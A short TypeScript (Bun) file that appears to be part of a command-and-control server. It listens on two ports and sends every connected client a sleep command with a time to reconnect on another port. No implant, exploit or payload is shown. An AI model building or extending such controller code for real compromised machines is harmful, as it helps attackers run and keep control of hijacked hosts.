import { ActionType, Command } from './c2-command'
import { Shard, type Connection, type Client } from './shard'

const inboundConnections = new Map<string, Connection>()
const clients = [] as Client[]

Bun.listen(Shard(8080, inboundConnections, clients))
Bun.listen(Shard(8081, inboundConnections, clients))
await new Promise<void>(res => setTimeout(() => res(), 5000))
clients.forEach((c) => {
  // reconnect in 5 seconds
  const reconnectTime = Math.floor(new Date().getTime() / 1000) + 5
  c.socket.write(new Command(ActionType.SLEEP, { time: reconnectTime, port: 8081 }).toBuffer())
})
